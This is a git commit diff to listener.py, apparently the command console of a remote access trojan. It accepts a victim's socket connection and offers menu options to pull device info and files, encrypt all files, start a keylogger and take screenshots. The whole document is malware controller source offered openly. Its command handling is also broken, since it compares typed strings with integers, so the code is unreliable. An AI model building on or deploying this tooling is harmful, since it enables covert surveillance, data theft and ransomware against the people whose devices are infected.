5c80e73351d7c50621d8e55ac25b230fa31481f8
sudopp1290 <sudopp1290@gmail.com>
2026-07-13 20:55:10 +0300

    Improve socket connection and command handling
    Refactor connection handling and command processing.

--- listener.py
+++ listener.py
@@ -4,54 +4,34 @@ connected = True
 def Connections():
     HOST = '127.0.0.1'
     PORT = 6654
+    global sock , client
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     sock.bind((HOST,PORT))
     sock.listen()
     print('[*] Waiting For Connection . . .\n')
-    cli, addr = sock.accept()
+    client, addr = sock.accept()
     print(f'Got Connection From {addr}\n')
-    return sock
+    return sock , client
 def menu():
     print('1. Get Device Info')
     print('2. See All Images/Videos (12. See All Files)')
     print('3. Encrypt All Files')
     print('4. Start Keylogger')
     print('5 Take Screenshot')
-def handle_commands(sock):
+def handle_commands():
     file_size = b''
-    command = input('>>> ').strip()
-    if command == '1':
-        comand = sock.send(command.encode())
-        remaining = file_size
-        with open("received_file.bin", "wb") as f:
-            while remaining > 0:
-                chunk = sock.recv(min(4096, remaining))
-                if not chunk:
-                    raise ConnectionError("Connection closed")
-                f.write(chunk)
-                remaining -= len(chunk)
-    elif command == '2':
-        comand = sock.send(command.encode())
-        with open("received_file.bin", "wb") as f:
-            while remaining > 0:
-                chunk = sock.recv(min(4096, remaining))
-                if not chunk:
-                    raise ConnectionError("Connection closed")
-                f.write(chunk)
-                remaining -= len(chunk)
-    elif command == '3':
-        comand = sock.send(command.encode)
-        with open("received_file.bin", "wb") as f:
-            while remaining > 0:
-                chunk = sock.recv(min(4096, remaining))
-                if not chunk:
-                    raise ConnectionError("Connection closed")
-                f.write(chunk)
-                remaining -= len(chunk)
+    while connected:
+        command = input('>>> ').strip()
+        if command == 1:
+            client.send(command.encode())
+        elif command == 2:
+            client.send(command.encode())
+        elif command == 3:
+            client.send(command.encode())
 def main():
-    sock = Connections()
+    Connections()
     while connected:
         menu()
-        handle_commands(sock)
+        handle_commands()
 main()
